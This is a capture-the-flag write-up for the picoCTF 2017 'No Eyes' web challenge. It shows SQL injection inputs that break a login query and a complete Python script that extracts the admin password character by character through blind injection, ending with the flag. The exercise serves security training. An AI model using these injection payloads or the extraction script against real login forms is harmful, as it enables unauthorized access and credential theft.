## No Eyes - 125

### Description

The [website](http://shell2017.picoctf.com:40788/) isn't really me much, but you can still get the admin password, right?

### Hint

  - Sometimes an error message can be just as useful.

### Write up

    username: admin'
    password: b

    select * from users where user = 'admin'';

---

    username: admin
    password: b'

    select * from users where pass = 'b'';

So, the server use select statement 2 times to validate user.

---

    username: admin
    password: ' or user='admin

    Login Functionality Not Complete. Flag is 63 characters

What we want is the admin password, so let's try blind sql injection.

```python
import requests

url = 'http://shell2017.picoctf.com:40788/'

alnum = '1234567890abcdefghijklmnopqrstuvwxyz_'
# alnum = '1234567890abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ~!@#$^&*()-=+_%'
num = '1234567890'

pw = ''
for idx in range(1, 64+1):
    for al in alnum:
        payload = {
            'username': "admin",
            'password': "' or user='admin' and substr(pass, %d, 1)='%s" % (idx, al),
        }

        while True:
            try:
                response = requests.post(url=url, data=payload)
                r = response.text
                break
            except:
                pass

        if 'Login Functionality Not Complete.' in r:
            print(idx, al)
            pw = pw + al
            break

        else:
            pass

print(pw)
```

> not_all_errors_should_be_shown_faa8380e951439eebb3d452b5e86f3f9
